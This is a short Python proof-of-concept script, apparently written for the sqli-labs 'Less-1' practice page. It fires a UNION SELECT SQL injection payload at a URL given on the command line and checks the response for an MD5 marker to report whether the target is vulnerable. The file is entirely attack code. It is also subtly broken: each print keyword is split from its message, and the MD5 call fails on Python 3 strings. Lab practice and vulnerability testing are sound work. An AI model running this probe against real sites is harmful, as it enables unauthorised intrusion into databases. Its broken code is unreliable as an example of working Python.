import requests
import sys
import hashlib


def verify(url):
    target = url + "/Less-1/index.php?id=10086%27union%20select%201,2,md5(123)%23"
    try:

        req = requests.get(target)
        response = req.text

        if response:

            if hashlib.md5('123').hexdigest() in response:
                print
                "%s is vulnerable" % target
            else:
                print
                "%s is not vulnerable" % target
    except Exception as e:
        print
        "Something happend...."
        print
        e

def main():
    args = sys.argv
    url = "http://192.168.110.123"
    if len(args) == 2:
        url = args[1]
        # print url
        verify(url)
    else:
        print
        "Usage:python %s url" % (args[0])


if __name__ == '__main__':
    main()
